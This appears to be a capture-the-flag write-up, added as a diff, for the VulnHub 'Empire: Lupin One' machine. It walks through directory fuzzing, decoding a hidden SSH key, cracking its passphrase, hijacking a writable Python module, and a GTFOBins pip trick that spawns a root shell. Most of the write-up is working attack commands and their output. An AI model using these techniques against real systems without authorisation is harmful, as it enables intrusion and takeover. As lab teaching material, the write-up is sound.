@@ -1,0 +1,180 @@
+---
+title: "Empire: Lupin One"
+platform: "VulnHub"
+difficulty: "Easy"
+os: "Linux"
+date: "2026-06-03"
+tags: ["linux", "ssh", "base58", "python-hijack", "pip", "gtfobins", "privilege-escalation"]
+description: "VulnHub machine with a base58-encoded SSH key hidden in a fuzzing-discovered directory. Got a shell as icex64 via SSH key + cracked passphrase, escalated to arsene by hijacking a writable Python library, then to root via pip (GTFOBins)."
+status: "complete"
+---
+
+---
+
+## 1. Information Gathering
+
+<TerminalOutput
+  cmd="nmap -A -T5 10.0.0.195"
+  rawHref="/writeups/raw/lupin-one/nmap.txt"
+  output={`PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5
+80/tcp open  http    Apache httpd 2.4.48
+| http-robots.txt: 1 disallowed entry
+|_/~myfiles`}
+/>
+
+Two ports: SSH and HTTP. Nmap already picks up `robots.txt` flagging `/~myfiles`.
+
+---
+
+## 2. HTTP Enumeration
+
+The homepage is just an image with a hint buried in the source: `<!-- Its an easy box, dont give up. -->`.
+
+<Screenshot
+  src="/screenshots/lupin-one/website-homepage.png"
+  alt="Homepage — fullscreen image of Arsène Lupin"
+  caption="Nothing on the surface — the clue is in the source"
+/>
+
+`robots.txt` disallows `/~myfiles`. Visiting it returns a fake 404 with another hint: `<!-- Your can do it, keep trying. -->`.
+
+<Screenshot
+  src="/screenshots/lupin-one/myfiles-fake-404.png"
+  alt="/~myfiles returning a fake 404 with an encouraging comment"
+  caption="Fake 404 — the page exists but is meant to mislead"
+/>
+
+Standard gobuster against the root finds nothing useful — `javascript/`, `image/`, `manual/`. The trick is fuzzing the tilde paths Apache uses for user directories.
+
+<TerminalOutput
+  cmd="gobuster fuzz -w raft-medium-directories.txt -u http://10.0.0.195/~FUZZ -b 403,404,500"
+  rawHref="/writeups/raw/lupin-one/gobuster-fuzz.txt"
+  output={`[Status=301] [Word=secret] http://10.0.0.195/~secret
+[Status=301] [Word=myfiles] http://10.0.0.195/~myfiles`}
+/>
+
+---
+
+## 3. /~secret
+
+<TerminalOutput
+  cmd="curl http://10.0.0.195/~secret/"
+  output={`Hello Friend, Im happy that you found my secret directory, I created like this to share with you my ssh private key file,
+Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.
+I'm smart I know that.
+Your best friend icex64`}
+/>
+
+Username: `icex64`. The key is hidden as a dotfile somewhere under `/~secret/`. Gobuster with common extensions didn't find it. Switched to ffuf targeting hidden files by fuzzing `.FUZZ`:
+
+<TerminalOutput
+  cmd="ffuf -w directory-list-2.3-medium.txt -u http://10.0.0.195/~secret/.FUZZ -fc 403 -e .txt,.html"
+  rawHref="/writeups/raw/lupin-one/ffuf-secret.txt"
+  output={`mysecret.txt  [Status: 200, Size: 4689, Words: 1, Lines: 2]`}
+/>
+
+---
+
+## 4. SSH Key
+
+`.mysecret.txt` is a massive single-line blob — base58 encoded.
+
+<TerminalOutput
+  cmd="curl http://10.0.0.195/~secret/.mysecret.txt >> secret.txt && base58 -d secret.txt"
+  output={`-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0...
+-----END OPENSSH PRIVATE KEY-----`}
+/>
+
+<Note type="note">
+  The `base58` CLI gave an "unsupported" error on the raw output. Decoded it via CyberChef instead, saved to `secret.key`, and set permissions: `chmod 400 secret.key`.
+</Note>
+
+The `/~secret/` page hints not to use fasttrack — so I used it:
+
+<TerminalOutput
+  cmd="ssh2john secret.key > hashjohn.txt && john --wordlist=fasttrack.txt hashjohn.txt"
+  rawHref="/writeups/raw/lupin-one/john.txt"
+  output={`P@55w0rd!  (secret.key)`}
+/>
+
+---
+
+## 5. Foothold
+
+<TerminalOutput
+  cmd="ssh -i secret.key icex64@10.0.0.195"
+  output={`Enter passphrase for key 'secret.key':
+Welcome to Empire: Lupin One
+icex64@LupinOne:~$`}
+/>
+
+<Note type="flag">
+  **user.txt** — `3mp!r3{"{"}I_See_That_You_Manage_To_Get_My_Bunny{"}"}`
+</Note>
+
+---
+
+## 6. Privilege Escalation — icex64 → arsene
+
+`sudo -l` shows icex64 can run `heist.py` as `arsene` without a password:
+
+```
+(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
+```
+
+`heist.py` only imports `webbrowser` — if I can hijack that module, I control what runs as arsene. Checking what's writable in the Python path:
+
+<TerminalOutput
+  cmd="find /usr/lib/python3.9 -writable 2>/dev/null"
+  output={`/usr/lib/python3.9/webbrowser.py`}
+/>
+
+The real `webbrowser.py` is writable. The `UnixBrowser` class has an `open()` method — that's where I injected a shell spawn:
+
+<Screenshot
+  src="/screenshots/lupin-one/webbrowser-open-function.png"
+  alt="webbrowser.py — UnixBrowser class open() function"
+  caption="The open() function inside UnixBrowser — the injection point"
+/>
+
+<Screenshot
+  src="/screenshots/lupin-one/webbrowser-injected.png"
+  alt="Injected os.system() call to spawn a shell as arsene"
+  caption="Added os.system() to spawn a shell before the original function body"
+/>
+
+<TerminalOutput
+  cmd="sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py"
+  output={`Its not yet ready to get in action
+arsene@LupinOne:/home/icex64$`}
+/>
+
+---
+
+## 7. Privilege Escalation — arsene → root
+
+<TerminalOutput
+  cmd="sudo -l"
+  output={`(root) NOPASSWD: /usr/bin/pip`}
+/>
+
+`pip` runs as root. GTFOBins pip trick — writes a `setup.py` that spawns a shell and installs it:
+
+```bash
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF
+```
+
+<TerminalOutput
+  cmd="sudo pip install $TF"
+  output={`Processing /tmp/tmp.23OKGkiu7U
+# whoami
+root`}
+/>
+
+<Note type="flag">
+  **root.txt** — `3mp!r3{"{"}congratulations_you_manage_to_pwn_the_lupin1_box{"}"}`
+</Note>
